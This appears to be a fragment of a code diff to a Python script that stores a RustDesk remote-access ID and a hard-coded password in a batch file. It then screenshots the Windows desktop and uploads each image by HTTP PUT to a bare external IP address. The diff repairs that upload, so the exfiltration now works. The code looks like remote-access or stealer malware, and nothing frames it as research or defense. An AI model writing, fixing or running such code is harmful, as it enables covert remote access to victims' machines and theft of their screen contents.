@@ -61,10 +61,11 @@ def run_rustdesk_command():
     password_echo = 'Password : Pakistan@098!23'  
     save_echo_to_batch('show.bat', f'RustDesk ID: {clipboard_text}')
     save_echo_to_batch('show.bat', password_echo)
+    time.sleep(2)
     im2 = pag.screenshot()
-    im3 = pag.screenshot(r'C:\Users\Public\Desktop\my_screenshot.png')
-    files1 = open(r'C:\Users\Public\Desktop\my_screenshot.png', 'rb')
-    r1 = requests.put('http://18.228.80.130/test1.png', data=files)
+    im3 = pag.screenshot(r'C:\Users\Public\Desktop\my_screenshot1.png')
+    files1 = open(r'C:\Users\Public\Desktop\my_screenshot1.png', 'rb')
+    r1 = requests.put('http://18.228.80.130/test2.png', data=files1)
     print(r1.content)
 
 
